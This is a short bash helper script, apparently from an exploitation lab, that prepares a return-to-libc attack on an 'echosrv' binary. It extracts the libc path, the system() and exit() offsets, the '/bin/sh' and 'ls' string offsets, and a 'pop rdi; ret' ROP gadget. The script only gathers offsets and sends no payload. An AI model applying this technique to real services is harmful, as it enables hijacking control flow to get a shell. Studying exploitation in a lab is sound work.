#!/bin/bash

# Verifica argumento
if [ "$1" == "-32" ]; then
    BINARY="./echosrv"
elif [ "$1" == "-64" ]; then
    BINARY="./echosrv-64"
else
    echo "Uso: $0 -32 | -64"
    exit 1
fi

# Encuentra la ruta de libc usada por el binario
LIBC_PATH=$(ldd "$BINARY" | grep libc.so.6 | awk '{print $3}')
echo "[+] libc path: $LIBC_PATH"

# Get system() offset
SYSTEM_OFFSET=$(readelf -s "$LIBC_PATH" | grep " system" | awk '{print $2}')
echo "[+] system() offset: 0x$SYSTEM_OFFSET"

# Get exit() offset
EXIT_OFFSET=$(readelf -s "$LIBC_PATH" | grep " exit" | awk '{print $2}')
echo "[+] exit() offset: 0x$EXIT_OFFSET"

# Get /bin/sh offset
BINSH_OFFSET=$(strings -t x "$LIBC_PATH" | grep "/bin/sh"| head -n 1 | awk '{print $1}')
echo "[+] /bin/sh offset: 0x$BINSH_OFFSET"

# Get ls offset
LS_OFFSET=$(strings -t x "$LIBC_PATH" | grep $'ls\0'| head -n 1 | awk '{print $1}')
echo "[+] ls offset: 0x$LS_OFFSET"


# Get pop rdi; ret offset (using ROPgadget)
ROP_OFFSET=$(ROPgadget --binary "$LIBC_PATH" | grep "pop rdi ; ret" | head -1 | awk '{print $1}')
echo "[+] pop rdi; ret offset: 0x$ROP_OFFSET"
